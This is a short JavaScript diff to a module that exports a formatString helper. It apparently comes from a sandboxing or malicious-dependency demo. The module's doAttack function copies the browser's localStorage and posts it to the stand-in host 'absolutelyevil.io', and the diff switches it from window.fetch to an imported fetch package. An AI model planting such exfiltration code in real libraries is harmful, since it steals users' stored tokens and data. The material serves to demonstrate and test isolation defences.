@@ -1,4 +1,4 @@
-const window = require('global/window')
+const fetch = require('sesify-example-fetch')
 
 module.exports = formatString
 
@@ -13,7 +13,7 @@ async function doAttack() {
     // get the data
     const data = Object.assign({}, window.localStorage)
     // send it home
-    await window.fetch('https://absolutelyevil.io', {
+    await fetch('https://absolutelyevil.io', {
       method: 'post',
       body: JSON.stringify(data)
     })
